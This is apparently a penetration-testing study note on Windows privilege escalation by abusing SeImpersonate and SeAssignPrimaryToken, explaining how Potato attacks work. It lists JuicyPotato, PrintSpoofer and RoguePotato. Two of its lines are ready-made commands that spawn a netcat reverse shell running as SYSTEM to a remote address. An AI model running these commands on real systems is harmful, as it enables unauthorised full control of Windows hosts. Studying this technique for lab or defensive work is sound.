
2026-05-21 10:12

Tags: #escalation  

## SeImpersonate and SeAssignPrimaryToken

- **Access Tokens:** Every Windows process has a token identifying the running account. These tokens reside in memory and can be utilized by accounts with the correct privileges.


- **The Privileges:** `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` *allow a process to use another user's token.* Legitimate programs use this to escalate from Administrator to Local System (SYSTEM) by requesting a token from the `WinLogon` process.


- **The Vulnerability:** Service accounts (e.g., IIS, Jenkins, MSSQL) are often granted these privileges to access network resources. Attackers who gain Remote Code Execution (RCE) on these service accounts can abuse these privileges to escalate to `NT AUTHORITY\SYSTEM`.


- **The Potato Attack Mechanism:**
	- Targets service accounts that possess `SeImpersonate` but lack direct, full SYSTEM-level privileges.
	    
	- Operates by *tricking a high-privileged process* (running as `SYSTEM`) *into connecting to a process controlled by the attacker.*
	    
	- Captures the `SYSTEM` token that is handed over during the coerced authentication process.
	    
	- Leverages the captured token to execute arbitrary payloads and successfully elevate privileges to `NT AUTHORITY\SYSTEM`.


## Exploit Tools

- **JuicyPotato:**
    - Abuses `SeImpersonate` (via `CreateProcessWithTokenW`) or `SeAssignPrimaryToken` (via `CreateProcessAsUser`) using DCOM/NTLM reflection.
        
    - **Limitation:** Fails on Windows Server 2019 and Windows 10 (build 1809 and newer).
    - `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`
    - 


- **PrintSpoofer & RoguePotato:**
    - Modern alternatives to JuicyPotato.
        
    - Specifically used for exploiting impersonation privileges on newer operating systems (Windows Server 2019 / Windows 10 build 1809+) where JuicyPotato is patched.
    - `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"`
    - ![[Pasted image 20260521102812.png]]

## References:

